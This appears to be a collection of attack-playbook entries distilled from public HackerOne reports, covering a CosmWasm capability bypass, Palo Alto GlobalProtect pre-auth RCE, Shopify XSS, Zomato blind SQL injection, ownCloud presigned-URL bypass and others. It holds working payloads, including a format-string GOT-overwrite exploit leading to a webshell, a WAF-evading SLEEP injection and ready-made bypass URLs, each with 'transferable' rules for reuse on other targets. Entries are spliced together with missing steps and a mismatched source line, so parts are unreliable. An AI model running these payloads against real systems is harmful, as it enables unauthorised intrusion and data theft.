STATUS: UNVERIFIED (not reproduced) — no CosmWasm chain was deployed; the steps and the code reference are quoted from the report.
CLASS: privilege escalation / authorization bypass of a CAPABILITY gate — the ARTIFACT self-declares the capabilities it requires, the host validates that DECLARATION only at upload/registration time, and nothing re-derives the requirement from the action at EXECUTION dispatch, so an artifact that simply OMITS the declaration is admitted and then executes the gated action.
CORE METHOD:
  1. Understand the intended model (the project's `CAPABILITIES.md`, quoted in the report): "The contract defines required capabilities. The environment defines its capabilities. If the required capabilities are all available, the contract can be used." A chain announces a capability set to forbid certain paths; a contract declares `requires_*` and must fit inside it.
  2. Remove the declaration from YOUR artifact: comment out the generation of the capabilities string in the CosmWasm compiler — report reference `https://github.com/CosmWasm/cosmwasm/blob/3a6093936520e9a1559423b50aa911ed9b836b3c/packages/std/src/exports.rs#L40` — so the compiled contract carries NO `requires_*` string.
  3. Deploy/upload it to a chain that announced NO capabilities (i.e. intended to disallow those actions): "The chain will allow the upload as the `requires_*` string is **not** present."
  4. Execute: the contract runs normally and "can execute _any_ action on that chain, even when the executing chain does not allow that capability" — because the runtime dispatch path never consults the capability list. The implementation is described in the report as a "naive implementation of capabilities and misleading documentation" that checks the declaration at admission only.
  5. Reporter's stated fix shape: "`capabilities` should be checked at runtime too. In particular, the `DefaultMessageHandler` should check for a capability before dispatching a message." Impact: "A blockchain that leverages `Capabilities` restrictions to prevent contracts from executing specific actions is open to attacks … this impact can potentially be **critical**."
DETECTION SIGNAL: any capability/permission/plan/entitlement model where the ARTIFACT or the CLIENT self-DECLARES what it needs — a manifest field, a `requires_*` string, a JSON scope/permission list, a `features` array sent by the client — and the host validates that declaration ONCE (at install / register / upload / onboarding) while the RUNTIME dispatch path never re-derives the requirement from the ACTION being performed; documentation that claims the gate is enforced. Tell: deleting or emptying the declaration still passes admission, and the gated action then succeeds.
CHAIN: attacker compiles/ships an artifact that omits the capability declaration (primitive: the declaration is attacker-controlled input) -> the host admits it because there is nothing in the declaration to reject (primitive: admission validates the DECLARATION, not the artifact's behaviour) -> at runtime the dispatch path performs no capability check (primitive: gate not enforced at execution) -> the artifact executes actions the environment explicitly disallowed = privilege escalation on the chain (team-rated Low, $2,000; reporter states the real impact can be critical depending on the chain's features).
TRANSFERABLE TEST: map every "capabilities / requires / scopes / enabled-features / plan" gate on the target; then try to get the gated ACTION executed with the declaration ABSENT — delete/empty the manifest field, strip the flag, send an empty scope/permission array, register a client that declares nothing. If admission still succeeds and the action runs, the gate is DECLARATION-ONLY. Rule: **a self-declared capability is not an authorization decision — always probe the runtime dispatch path with the declaration removed, and treat "the manifest says what it needs" as attacker-controlled, unauthenticated input.**
DEDUPE: 0 hits across all three write targets for `2930811`, `julianor`, `cosmwasm`, `requires_`, `DefaultMessageHandler`, `CAPABILITIES.md`, `exports.rs`, `non-enabled capability`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: §17.78 (a CLIENT-SIDE-only feature gate — a UI switch, not a server admission/runtime gate) and the recorded privileged-capability-string disclosure (the HackerOne RBAC `team_member_groups{permissions}` entry, where the leaked permission identifier strings are an aiming sheet, not a bypass). Nothing in the file records a gate that validates a self-declared manifest at admission but skips enforcement at dispatch. New general method -> §17.205.

SOURCE: https://hackerone.com/reports/540242  2026-11-08
ROUTE: report BODY is `visibility: "no-content"` — measured this pass: live `curl -H 'Accept: application/json' https://hackerone.com/reports/540242.json` -> HTTP 200, 4,938 B, `vulnerability_information` 0 B (also 0 B in the LOCAL HF dataset row 540242). The report's PUBLIC PROGRAM SUMMARY (read this pass from the mirror `raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/540242.md`, HTTP 200, 726 B) is one line, verbatim: "format string vulnerability on /sslmgr with no authentication required". The full technique — the verified request, the non-destructive timing oracle, the exploitation and the Uber case study — was read this pass from the CREDITED PUBLIC WRITEUP authored by the reporter: Orange Tsai / Meh Chang, "Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!", `https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html` (cross-post of `https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/`; all requests/commands below are verbatim from it). Metadata (H1 JSON): Uber, weakness "Command Injection - Generic", **Critical**, $2,000, 80 votes, reporter orange, submitted 2019-04-16, disclosed 2021-02-24.
STATUS: UNVERIFIED (not reproduced) — no GlobalProtect appliance was touched; every request shape and exploit fragment is quoted from the credited writeup.
CLASS: pre-authentication RCE via a FORMAT-STRING vulnerability — a request parameter's value is passed straight into `snprintf` as the FORMAT string, giving `%n` arbitrary write; the chain ends by overwriting a GOT entry with `system`'s PLT address, turning the daemon into an unauthenticated webshell.
CORE METHOD:
  1. Fingerprint: the host 302-redirects the web root to `/global-protect/login.esp` (Palo Alto GlobalProtect). The SSL-gateway daemon `sslmgr` is exposed by an Nginx reverse proxy at path `/sslmgr`; an unauthenticated `GET /sslmgr` answers with an XML `clientcert-response` containing `Invalid parameters`.
  2. Locate the sink: "During the parameter extraction, the daemon searches the string `scep-profile-name` and pass its value as the `snprintf` format to fill in the buffer." Crash-level confirmation is `POST /sslmgr` with `scep-profile-name=%n%n%n%n%n...` (a watchdog may restart the daemon; do not use this on a live host).
  3. NON-DESTRUCTIVE confirmation (the reusable trick): use the `%<N>c` width specifier — `snprintf` repeats the output N times internally, so the RESPONSE TIME scales with N, proving format-string control without a leak and without crashing (writeup's measurements verbatim):
     ```
     $ time curl -s -d 'scep-profile-name=%9999999c'   https://global-protect/sslmgr   # real 0m1.721s
     $ time curl -s -d 'scep-profile-name=%99999999c'  https://global-protect/sslmgr   # real 0m2.051s
     $ time curl -s -d 'scep-profile-name=%999999999c' https://global-protect/sslmgr   # real 0m5.324s
     ```
  4. Fingerprint the exact build for the exploit's offset constants: `curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified` (and `/images/logo_pan_158.gif` for the 7.x line). Affected per the writeup: 7.1.x < 7.1.19, 8.0.x < 8.0.12, 8.1.x < 8.1.3 — i.e. everything before July 2018; 9.x and 7.0.x are not affected.
  5. Exploit (writeup PoC, Python): overwrite the GOT entry of `strlen` with the PLT address of `system` using `%<n>$n` / `%<n>$hn` writes; the target addresses are spread across SEVERAL POST parameters (`scep-profile-name`, `appauthcookie`, `host-id`, `user-email`) so `p32(addr)` bytes land on the stack where the `%N$` positional specifiers can reach them, and the shell command rides the last `appauthcookie`:
     ```
     fmt  = '%70$n'
     fmt += '%' + str((system_plt>>16)&0xff) + 'c' + '%32$hn'
     fmt += '%' + str((system_plt&0xffff)-((system_plt>>16)&0xff)) + 'c' + '%24$hn'
     data  = 'scep-profile-name=' + p32(strlen_GOT)[:-1]
     data += '&appauthcookie='   + p32(strlen_GOT+2)[:-1]
     data += '&host-id='         + p32(strlen_GOT+4)[:-1]
     data += '&user-email='      + fmt
     data += '&appauthcookie='   + cmd            # e.g. 'echo pwned > /var/appweb/sslvpndocs/hacked.txt'
     ```
     Once the pointer is rewritten, "the `sslmgr` becomes our webshell": `curl -d 'scep-profile-name=<command>' https://target/sslmgr`.
  6. Reach-in-scale amplifier: the bug was a SILENT-FIX 1-day with no public CVE/advisory; the writeup surveyed internet-facing hosts and found the vulnerable build widely deployed, incl. ~22 Uber servers (case study `vpn.awscorp.uberinternal.com`, version identified as 8.0.6).
DETECTION SIGNAL: an unauthenticated endpoint that takes a NAMED parameter (`scep-profile-name`, or any `*-name` / `profile` / `template` / `msg` field) into a logging/formatting routine; latency that SCALES with the repeat count in `%<large>c` (the safe oracle); user input reaching a `printf`/`snprintf`/`syslog`/`fprintf` FORMAT slot (a bare `%`/`%s` causing garbled, truncated or empty output, or a crash); internet-exposed SSL-VPN / appliance management daemons (GlobalProtect `/sslmgr`, plus peers) where a single HTTP parameter is the only input needed.
CHAIN: unauthenticated attacker (primitive: the `/sslmgr` parameter requires no session) -> supplies `%Nc`/`%n` and observes the timing differential (primitive: format-string control, confirmed non-destructively) -> derives the exact build from a `Last-Modified` header (primitive: version -> offsets) -> `%n$hn` positional writes overwrite `strlen`'s GOT with `system`'s PLT (primitive: GOT overwrite -> controlled command execution) -> the daemon serves commands as a webshell (primitive: pre-auth RCE) -> full control of the SSL-VPN appliance = a foothold into the corporate intranet (triage: Critical, $2,000).
TRANSFERABLE TEST: for any appliance or network daemon reachable through one HTTP parameter, first prove format-string control WITHOUT crashing — send `param=%<N>c` for increasing N and measure response time (a widening delta means the value is the format string); then map the binary (legacy non-PIE / ASLR-off builds are the easy case), find a GOT slot whose function is called on attacker data, and rewrite it to `system`/`execve`'s PLT via `%n`/`%hn` writes spread across parameters so the addresses land on the stack. Rule: **`%<N>c` timing is the non-destructive format-string oracle — you do not need `%n`, a leak, or a crash to CONFIRM the bug; you need them only to exploit it.**
DEDUPE: 0 hits across all three write targets for `540242`, `sslmgr`, `GlobalProtect`, `scep-profile-name`, `format string`, `snprintf`, `%9999999c`, `orange`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: the file's `sprintf`-adjacent hits are unrelated (a shellcode/CTF fragment and a `gmp_sprintf` note); the recorded appliance/RCE entries are web-app or kernel RCEs, none a format-string in a request parameter. Nothing records the `%<N>c` timing oracle or the GOT->PLT webshell technique. New general method -> §17.206.

CLASS: reflected XSS via PARAMETER-NAME attribute injection — the sink is the request KEY, not the value: a query key containing a SPACE is interpolated UNESCAPED into the newsletter `<input>` tag's attribute list, so the key closes its attribute slot and adds an event-handler attribute that fires on page load.
CORE METHOD:
  1. Target a storefront (theme) newsletter/contact form: `*.myshopify.com/?contact[email]=…`. The form is server-rendered and its input attributes are assembled from the request's bracket-array KEYS.
  2. Inject through the KEY, not the value: put a space plus attributes inside a second array key so the key breaks out of the attribute context. The report's URL, verbatim:
     ```
     https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
     ```
     decoded key = `contact[email] onfocus=javascript:alert('xss') autofocus a=a`; `onfocus=javascript:` sets the handler, `autofocus` makes the element focus itself so the handler fires with NO user interaction, and the trailing dummy key `form_type[a]aaa` keeps the request syntactically valid.
  3. Report's own framing: "*.myshopify.com is vulnerable to a reflective cross-site scripting attack in the newsletter form. This can be crafted to trigger on a page load without any further user interaction." Tested on a newly registered store (`testbuguser.myshopify.com`).
  4. Impact wording, verbatim: "This attack could be leveraged to compromise administrative sessions or perform actions on behalf of users with the same level of privilege as the user." (Team rated it High.)
DETECTION SIGNAL: a server-rendered HTML `<input>`/`<form>`/`<a>` whose attributes are built from the request's PARAMETER NAMES/keys (array-style keys such as `contact[email]`, `form_type[a]`, `field[0]`, `q[name]`); the VALUE may be perfectly escaped while the KEY is not — send a key containing a SPACE and watch for an extra attribute appearing in the rendered tag. Any request key reflected into markup is the primitive.
CHAIN: attacker crafts a URL (primitive: a parameter KEY injects attributes into the form's input tag) -> `onfocus=javascript:` + `autofocus` executes with zero interaction (primitive: no-click script execution in the page) -> the script runs in the storefront origin / the victim's session context (primitive: reflected XSS) -> "compromise administrative sessions or perform actions on behalf of users" (High, $2,000).
TRANSFERABLE TEST: on any form endpoint, send the SAME payload TWICE — once as a VALUE and once as a KEY that contains a space plus `onfocus=javascript:alert(1) autofocus a=a` (e.g. `?x[email]%20onfocus%3d...%20autofocus%20a=a&y[b]b`). If the value is escaped but the key renders an extra attribute into the tag, you have parameter-NAME injection. Rule: **escaping is applied to values; the parameter NAME is a separate sink — test keys with spaces, brackets, quotes and `onfocus`/`autofocus` whenever a form echoes its request parameters back into markup.**

ROUTE: report BODY is `visibility: "no-content"` — live `curl -H 'Accept: application/json' https://hackerone.com/reports/1314162.json` -> HTTP 200, 4,824 B: title / weakness / severity / reporter / dates present, `vulnerability_information` 0 B. The readable content is the report's PUBLIC TEAM SUMMARY (LY Corporation), which survives verbatim TWICE: in the `.json` under `summaries[]` (`category: "team"`, `updated_at 2021-12-27`) and rendered on the page by `https://r.jina.ai/https://hackerone.com/reports/1314162` (HTTP 200, 7,152 B — the ONLY route that rendered the page TEXT this pass; `web_extract` on the page returned the SPA shell ["Log in", no report text], and the `ajaysenr/HackerOne-Disclosed-Reports` mirror `reports/1314162.md` (HTTP 200, 1,144 B) carries the identical summary above the line "No vulnerability information available"). Metadata (H1 JSON): LY Corporation (handle `line`), "Improper authorization allows disclosing users' notification data in Notification channel server", weakness Improper Authorization, **High 8.3** (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N — note the Team severity was FIRST set `critical(9.3)` then DOWNGRADED to `high(8.3)` on 2021-09-01), $1,000 bounty **plus a $1,000 bonus** ($2,000 total), 78 votes, reporter aki__0421, asset "LINE Messenger - Chat (OTHER)", submitted 2021-08-21, disclosed 2021-12-31.
STATUS: UNVERIFIED (not reproduced) — no LINE channel was created and no Notifications Channel service was touched; every sentence below is the team summary, quoted.
CLASS: broken access control by AUTHENTICATION-CONTEXT CONFUSION — the service validates that a presented token is a VALID token from the issuer, but never binds that token to the channel/tenant whose data the request asks for, so a token minted for the attacker's own channel reads another user's channel data.
CORE METHOD (all four steps are the team summary's own account, verbatim quotes marked):
  1. Model the credential: "LINE Channel authentication provides separate authentication tokens for each LINE Channel." Each Messaging-API channel therefore holds its OWN token — and the attacker controls one of them.
  2. Create the attacker-controlled channel and get a victim on it: "for example, if an attacker creates their own channel and makes victim account to join it." (UI:R — one join by the victim.)
  3. Present YOUR channel's valid token to the SIBLING service while asking for the victim's data: "Due to the bug in the authentication process in the Notifications Channel service, it could be possible for an attacker to get the Notifications Channel data of another user by using their valid authentication token from another channel."
  4. Read the disclosed data — the Notifications Channel payload of the victim's account (the resource the Notification channel server serves).
DETECTION SIGNAL: an issuer that mints many tokens of the same TYPE, one per channel/bot/app/tenant/workspace; a set of sibling services where each validates the token's SIGNATURE/validity but the token carries a channel/tenant claim that is never compared against the channel/tenant in the request path, query, body or `X-*-Channel-Id`-style header; an invite/join/follow step that lets a user of one tenant be added to another's; two tokens of the same issuer accepted interchangeably anywhere.
CHAIN: attacker owns ONE channel (primitive: attacker-controlled, attacker-known token — no victim secret needed) -> victim account joins the attacker's channel (primitive: one user interaction) -> the Notification Channel service accepts the attacker's token for the VICTIM's channel because the token is never bound to the requested resource (primitive: authentication-context confusion) -> the victim's Notification Channel data is disclosed to the attacker (High 8.3, $2,000 = $1,000 bounty + $1,000 bonus). The cross-channel token is the whole bug; the join is only the delivery.
TRANSFERABLE TEST: on any service that issues ONE credential per channel/bot/app/tenant, collect TWO tokens YOU own (channel A and channel B) and replay token A against EVERY endpoint that names channel B in the path / query / body / header (and B against A). Then take the harder step the report needs: get a SECOND account joined to your own channel and try to read THAT account's data with your channel's token. A response containing data that belongs to a channel other than the token's own channel proves the binding gap. Rule: **`valid signature` != `correct context` — on every "one credential per tenant" issuer, test whether the token is bound to the resource it is presented against.**
DEDUPE: 0 hits across all three write targets for `1314162`, `aki__0421`, `line`, `LY Corporation`, `Notifications Channel`. Related-but-distinct pre-existing material REVIEWED and NOT re-recorded: the single `notification channel` hit in the ledger (batch-59 entry, ~line 5621) is about a ROLE assignment granting an implicit READ via a notification SUBSCRIPTION (email/push/feed surfaces of a private object); this entry is a TOKEN-VALIDITY-vs-TOKEN-CONTEXT gap between two sibling services — a different primitive (credential confusion, not subscription breadth). Cross-tenant IDOR/the `tenant`/`organisation` material (~120 ledger hits) is object-id substitution, not credential substitution. New general method -> §17.208.

STATUS: UNVERIFIED (not reproduced) — no Showmax account was created this pass.
CLASS: broken access control on a SECRET-REVEALING form endpoint — the parental PIN (a control the RESTRICTED profile is not supposed to know) is rendered by a directly GET-able settings route to ANY authenticated session of the account, and the same route lets the PIN be MUTATED, because the account-password confirmation lives only in the UI wizard. CORE METHOD (steps verbatim from the credited writeup; see ATTRIBUTION above):
  1. Log in to Showmax and set a parental PIN on the kids/restricted profile (the state the control is meant to enforce).
  2. Reproduce the blocked flow: "Go to https://www.showmax.com/eng/home / click watch triller / you will asked for parental pin".
  3. The bypass: from the SAME restricted session, navigate DIRECTLY to the parental-control form route — verbatim: `https://www.showmax.com/eng/parentalControlForm/%2Fhome/true` (the path segment is a URL-encoded return path `%2Fhome` plus a client-controlled boolean `true`).

  5. "now you change the parental pin , and you can bypass the password confirmation , for parental control" — the same route MUTATES the PIN, so the control is defeated, not merely disclosed.
DETECTION SIGNAL: a settings/secret endpoint (PIN, password, 2FA secret, recovery codes, API key) that answers a plain GET with the secret IN the response body; a `password_confirmation` / re-auth step that exists ONLY as a UI wizard step while the underlying route is directly addressable; a route whose PATH carries client-controlled routing data — a return/redirect path and a boolean (`/parentalControlForm/%2Fhome/true`); a "restricted"/child/low-privilege profile that can still fetch the control's own page. CHAIN: restricted (kids) session — the exact low-privilege context the parental control exists to constrain (primitive) -> direct GET of the parental-control form route with a crafted path (`%2Fhome/true`) (primitive: re-auth enforced in the UI, not at the data endpoint) -> the stored parental PIN is disclosed in the response (primitive: secret disclosure, no password confirmation) -> the PIN is CHANGED through the same unguarded route (primitive: control mutated) -> the content-maturity control is fully bypassed = privilege escalation out of the restricted profile (High, $2,000).
TRANSFERABLE TEST: for EVERY PIN / password / 2FA-secret / recovery-code / API-key settings screen, capture the exact request the UI issues AFTER the re-auth prompt, then REPLAY that request from a context that never re-authenticated — a second tab, an old session, and above all the RESTRICTED/child profile the control is meant to hold back. If the secret comes back, the confirmation is UI-only. Then mutate the client-controlled path parts (`true`/`false`, the encoded return path) and re-issue. Rule: **the password-confirmation step is an authorization decision — verify it server-side on the endpoint that RETURNS or MUTATES the secret, never rely on it being in the wizard.**

STATUS: UNVERIFIED (not reproduced); NOTE THE AGE (2020) — the WAF rule shape is version-specific and must be re-measured live.
CLASS: time-based BLIND SQL injection in a **"LocalParam"** — a parameter whose value the application composes as an ARITHMETIC EXPRESSION (`<int>-<user input>`), reached through a WAF that blocks the SPACE character (defeated by comment-as-whitespace `/**/`).
CORE METHOD (payload verbatim from the report body — "a Temporal Exploit based on the Vulnerable request"):
  1. Entry point: `POST /php/geto2banner HTTP/1.1` / `Host: www.zomato.com` / `Content-Length: 73` / `Content-type: application/x-www-form-urlencoded` with body:
     `res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0`
  2. Why the `-` works: the report names `res_id` a **LocalParam** — the parameter is a LOCAL-FILE-STYLE "parameter file" path/id whose value the code evaluates as an EXPRESSION, so `51-CASE WHEN ... THEN SLEEP(6*1) END` is parsed as `51 - (CASE ...)`: a type-valid arithmetic operand, not a broken query. The same shape works when a numeric id is prefixed by an integer and a `-`/`+`.
  3. Why `/**/`: the payload contains **no space character anywhere** — every separator MySQL needs is supplied as an inline comment. `CASE/**/WHEN(…)/**/THEN(…)/**/END`. (Deliberately distinguished from the recorded Zomato bypass in this same ledger, #403616 / §17.116, which inserts a comment BETWEEN A FUNCTION NAME AND ITS `(` — `sleep/*f*/(10)`; here the comment replaces WHITESPACE between KEYWORDS. Both tricks are now on file; they answer different WAF rules.)
  4. Oracle: TIME ONLY, no error text and no body change. The verbatim predicate leaks one bit per request (`LENGTH(version())=10`); iterate by swapping the predicate for `MID(SUBSTRING(…))`-style character tests inside the same `CASE/**/WHEN`/`THEN(SLEEP(n*1))` skeleton.
  5. Impact, verbatim: "Full database access holding private user information." Reported severity Critical.
DETECTION SIGNAL: a numeric-looking identifier (`res_id`, `item_id`, `*_id`, `city_id`) whose value the app treats as an EXPRESSION — sending `<int>-<expr>` (or `<int>+<expr>`) still answers normally instead of 400-ing; an endpoint that returns `200` with an identical body no matter what you send (the tell that only TIME will be your oracle); a WAF that 403s on a SPACE but accepts `/**/`; latency that scales with a `SLEEP()` argument.
CHAIN: unauthenticated POST (primitive: no session required) -> expression injection into the `res_id` LocalParam, past a space-blocking WAF using `/**/` as whitespace (primitive: WAF bypass) -> `CASE/**/WHEN(<pred>)/**/THEN(SLEEP(n*1))/**/END` time oracle (primitive: blind boolean) -> character-by-character extraction of the backing database incl. private user data (Critical; the report's own impact line "Full database access holding private user information").
TRANSFERABLE TEST: for every numeric "LocalParam"/id that the app composes into an expression: baseline the response time, then send `res_id=<int>-CASE/**/WHEN(1=1)/**/THEN(SLEEP(5))/**/END` and `res_id=<int>-CASE/**/WHEN(1=2)/**/THEN(SLEEP(5))/**/END`; a ~5 s delta on the first is a confirmed blind injection. IF A SPACE IS BLOCKED, do not hunt for a synonym — re-issue the SAME payload with `/**/` in EVERY whitespace position. Rule: **when a WAF eats only the space character, `/**/` is your whitespace: `CASE/**/WHEN/**/<pred>/**/THEN/**/SLEEP(n)/**/END`.**
DEDUPE + DELTA: 0 hits across all three write targets for `838855`, `zzzhacker13`, `geto2banner`, `LocalParams`, `51-CASE`, `/**/WHEN`, `city_id=0`. RELATED-BUT-DISTINCT, REVIEWED AND NOT RE-RECORDED: the ledger ALREADY records this SAME TARGET with the SAME `res_id` request shape — #403616 (ledger ~4183-4194 = §17.116, "Eternal … SQLi - /php/████ … item_id", reporter gerben_javado) — and its WAF bypass is `sleep/*f*/(10)` (comment between the FUNCTION NAME and its `(`), plus the value-keyed DB cache-bust by mutating the leading integer; generic `SLEEP()`/`IF()` timing material and `CASE WHEN` oracles are likewise already extensive in the SQLi sections (e.g. ledger ~769-783 `(CASE WHEN 1=1 THEN BENCHMARK(…))`, playbook lines ~10685-10717). The genuinely NEW bits here are only (1) the comment used as WHITESPACE (`CASE/**/WHEN`) rather than inside a function call, and (2) the fully space-free oracle skeleton. Recorded as a DELTA of the recorded §17.116 family, and therefore given **NO new §17 slot** (same treatment as the recorded same-family deltas at ledger ~3586 / ~4181).

CLASS: broken access control / privilege escalation via SELF-SERVICE ORGANIZATION REGISTRATION — the onboarding flow authenticates the natural PERSON (strong bank-grade TUPAS auth) but proves the ORGANIZATION only by a self-declared checkbox plus a typed public company id, so the attacker is issued an ADMIN ("pääkäyttäjä") account over a company they do not own.
CORE METHOD (all steps verbatim from the body):

  4. "Do TUPAS authentication and follow registration till end" — complete STRONG BANK authentication, which proves only that the attacker is a real natural person, NOT that they are the company.
  5. "Login using fresh credentials (email+passwd)" at `https://yrityspalvelu.tapiola.fi/a1/tatuma/jsp/kayttaja/kirjaudu.jsp`.
  6. "View bills, company information, made insurance claims etc.." — the victim company's account data (contracts, bills, insurance claims) is readable.

I tried with 'clean/fresh' company." — the soft target is an org that has never had an admin.
DETECTION SIGNAL: a B2B/self-service onboarding or "claim your company" flow that identifies the ORGANIZATION by a PUBLIC identifier (business id / VAT / tax id / registration number / domain) and then grants a role (admin/owner) on it; strong PERSONAL authentication in the flow (bank SSO, MFA, government eID) with the org link proven only by a checkbox, a typed field, or an unverified email domain; an org in a "fresh"/unclaimed state (no existing admin) as the exploitable case. The strength of the personal auth is a red herring — it is exactly what hides the missing org check from triage.
CHAIN: attacker passes bank-grade TUPAS as a real person (primitive: strong PERSONAL identity, ZERO organization proof) -> supplies the victim's public y-tunnus and ticks the self-declared permission checkbox "Minulla on lupa tehdä yrityksen verkkopalvelusopimus." (primitive: the organization is validated by DECLARATION) -> the platform issues fresh ADMIN credentials for that company (primitive: privilege escalation into a foreign tenant) -> the company's bills, contracts and insurance-claim data are read (the program's own summary: "circumvent the privilege system for the admin-user for a company account … gain access to critical information in the company account, including user data") — on an asset scoped `max_severity: critical`.
TRANSFERABLE TEST: find the B2B signup / "claim your company" / self-service contract flow and register a NEW account naming an ORG YOU DO NOT CONTROL, using only its PUBLIC identifier (business id / VAT / registration number / domain). Complete whatever identity proof the flow demands, then check whether you hold an admin/owner role on that org and can read its data. Vary the ORG STATE — one that has never had an admin is the soft target. Rule: **strong personal authentication is NOT organization authorization — enumerate every flow that binds a user to an organization through a public identifier plus a self-declared claim.**

Metadata (mirror + H1 hacktivity CSV): GSA Bounty, "CI for [example.gov] can be logged in and accessible", weakness **Improper Access Control - Generic**, **Critical — CVSS 9.0**, **$2,000**, 49 votes, reporter **kunal94**, submitted 2018-02-01, disclosed 2018-02-07, resolution Resolved.
STATUS: UNVERIFIED (not reproduced) — no government asset was touched; NOTE THE AGE (2018) and that the technical detail available is the team's summary, not the reporter's raw steps.
CLASS: broken access control / authentication bypass at an EXPOSED INTERNAL CI/CD BUILD SERVER — a build/deployment panel found by a public-search-engine dork whose login page is DECORATIVE ("click 'log in'" with no credential check), giving unauthenticated access to the CI/CD interface of a PRODUCTION component and to a set of DEPLOYMENT CREDENTIALS.
CORE METHOD (steps are the program summary's, verbatim where quoted — see ROUTE/honesty):
  1. An in-scope URL (`example.gov`, one of the TTS Bug Bounty scope URLs) is dorked: searching a public search engine for `inurl:example.gov` ("where `example.gov` was one of the URLs in the TTS Bug Bounty scope").
  2. The search results "included a CI/CD build results URL" — an internal build/deployment host that is never linked from the normal application flow.
  3. "When anyone visited that build results page, they were faced with a login page" — the gate LOOKS like authentication.
  4. THE BYPASS, verbatim: "but if they clicked 'log in', no authentication was required." Submitting the login form admits the visitor; the gate is cosmetic.
  5. GAIN, verbatim: "This exposed the CI/CD interface for a production component, including a set of deployment credentials. It would have been possible to leverage these credentials to get other privileges." — i.e. the escalation path past the panel itself is the DEPLOYMENT CREDENTIALS it discloses.
DETECTION SIGNAL: an internet-reachable build / CI / deployment panel (Jenkins, GitLab CI, Bamboo, TeamCity, a bespoke "build results" UI, a `*.ci.` / `deploy.` / `pipeline.` host) that is dorkable via `inurl:`/`site:` on the in-scope domain and its subdomains; a login page whose SUBMIT does not actually establish a session — the tell is that the resulting page renders authenticated data with NO auth cookie set (check Set-Cookie and re-request the authenticated URL in a fresh client); a panel whose own pages expose artifacts, environment, job config or credentials of a PRODUCTION component. Rule: the presence of a login FORM is not evidence of authentication — a dork-reachable internal panel is a higher-priority test than the main app.
CHAIN: public search engine dork on the in-scope domain (`inurl:example.gov`) locates an internal CI/CD build-results host never linked from the app (primitive: exposed internal host) -> its login page treats the CLICK/SUBMIT as authentication, so no credential is verified (primitive: authentication bypass / decorative gate) -> the attacker is inside the CI/CD interface of a PRODUCTION component and reads a set of DEPLOYMENT CREDENTIALS (primitive: credential disclosure) -> the team's own escalation note: those credentials "would have been possible to leverage … to get other privileges" = access/privesc into the production deployment path (asset rated Critical CVSS 9.0, $2,000).
TRANSFERABLE TEST: dork the in-scope wildcard for the build/deploy estate — `site:*.target.com (jenkins|build|ci|deploy|bamboo|teamcity|pipeline)` plus `inurl:build` / `inurl:job` / `inurl:results` — then, on ANY login page you reach, do NOT stop at "there is a login form": SUBMIT it (and click the panel's own "log in" control) and check whether you obtain the authenticated view with NO valid session (Set-Cookie absent; the authenticated URL re-fetches its data in a fresh client). A page that renders authenticated data without a session cookie is an auth bypass; enumerate the credentials/artifacts/env it exposes and follow them toward the production deployment path. Rule: **a dork-reachable internal CI/CD panel whose login is cosmetic is an unauthenticated admin/internal-panel access that ships deployment credentials — test the gate, don't assume it.**
DEDUPE: 0 hits across all three write targets for `311289`, `kunal94`, `inurl:example.gov`, `build results`, `deployment credentials`, `CI for`. SOURCE: https://hackerone.com/reports/2337427  2026-11-08
ROUTE: `visibility: "full"` — the entire reporter body (3,069 B) read this pass from the live `curl -H 'Accept: application/json' https://hackerone.com/reports/2337427.json` (HTTP 200, 21,792 B envelope) AND independently from the LOCAL disclosed-report mirror `/tmp/h1_train.parquet` (row id 2337427, `visibility: full`, same 3,069 B — the two agree). Metadata (H1 JSON): ownCloud, "Authentication Bypass with usage of PreSignedURL", weakness (unset in JSON; classed BAC), **High**, 2024-01-27 submitted / 2024-03-22 disclosed. The body cites the vulnerable source at `github.com/owncloud/ocis` v4.0.5 (`services/proxy/pkg/config/defaults/defaultconfig.go#L74`, `services/proxy/pkg/middleware/signed_url_auth.go#L73` `validate` -> `#L126` `urlIsExpired`).
STATUS: UNVERIFIED (not reproduced) — no ownCloud Infinite Scale instance was stood up this pass; the request shape, the code path and the root cause are quoted from the report.
CLASS: AUTHENTICATION BYPASS in a PRESIGNED-URL validator — the expiry check SHORT-CIRCUITS on an EXPIRED timestamp (returns a nil error), so the SIGNATURE is never verified and any caller who knows a username + filename downloads the (private, unshared) file with no session (ownCloud Infinite Scale / oCIS; CWE-863; default-enabled `PreSignedURL`).
CORE METHOD (steps verbatim from the report):
  1. Preconditions: `PreSignedURL` is ENABLED by default with `AllowedHTTPMethods: []string{"GET"}` (so downloads are signed-URL-able), and the target file is NOT public and NOT shared with anyone (the report proves this with screenshots).
  2. Entry point is the WebDAV file path: `GET /remote.php/dav/files/{username}/{filename}` — only a USERNAME and a FILENAME are needed, both often discoverable (shares, comments, activity, links, sitemaps).
  3. Attach the presigned-URL query set: `?OC-Credential={username}&OC-Verb=GET&OC-Expires=60&OC-Date=<ISO timestamp>&OC-Signature=<value>` — the report's own link: `https://localhost:9200/remote.php/dav/files/admin/secret.txt?OC-Credential=admin&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked`.
  4. THE BYPASS: set `OC-Date` to an ALREADY-EXPIRED timestamp and put ANY junk in `OC-Signature` (literally the string `notchecked`). Root cause, verbatim: "in the case of expired dates, the function returns a null error, resulting in successful authentication of requests without checking the user's signing signature/key." The signature/key is therefore never validated — the expiry branch FAIL-OPENS.
  5. Result: the private file's contents are returned with no authentication. Vulnerable tags named: v4.0.5, v5.0.0-rc.2, v5.0.0-rc.3. Temporary remediation named: `PROXY_ENABLE_PRESIGNEDURLS=false`.
